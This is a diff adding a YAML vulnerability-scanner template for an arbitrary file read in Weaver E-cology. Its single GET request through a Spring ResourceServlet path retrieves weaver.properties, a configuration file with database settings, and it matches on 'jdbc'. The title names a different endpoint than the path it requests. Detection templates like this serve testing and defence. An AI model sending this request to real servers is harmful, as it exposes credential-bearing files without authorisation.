@@ -1,0 +1,19 @@
+id:
+
+info:
+  name: 泛微E-cology ProcessOverRequestByXml 任意文件读取漏洞
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: GET
+  path: /weaver/org.springframework.web.servlet.ResourceServlet?resource=/WEB-INF/prop/weaver.properties
+  headers:
+    User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
+    Connection: Keep-Alive
+response1:
+  body: jdbc
+  code: 200
+requests2:
+response2:
